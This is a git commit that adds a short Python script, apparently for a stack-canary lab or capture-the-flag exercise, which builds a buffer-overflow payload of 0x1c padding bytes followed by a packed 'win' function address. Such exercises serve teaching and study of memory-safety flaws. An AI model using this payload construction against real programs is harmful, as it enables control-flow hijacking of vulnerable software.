83dcf19b5579889c8e6de60d5f7265496a942c8d
sage <jjhcat0402@gmail.com>
2026-02-20 16:43:35 +0900

    Add payload generation script for stack canary

---
+++ stack-canary/payload.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python3
+import sys, struct
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <win_addr_hex>")
+    sys.exit(1)
+
+win = int(sys.argv[1], 16)
+OFFSET = 0x1c  # 0x18 + 0x4
+
+payload = b"A" * OFFSET
+payload += struct.pack("<I", win)
+
+sys.stdout.buffer.write(payload)
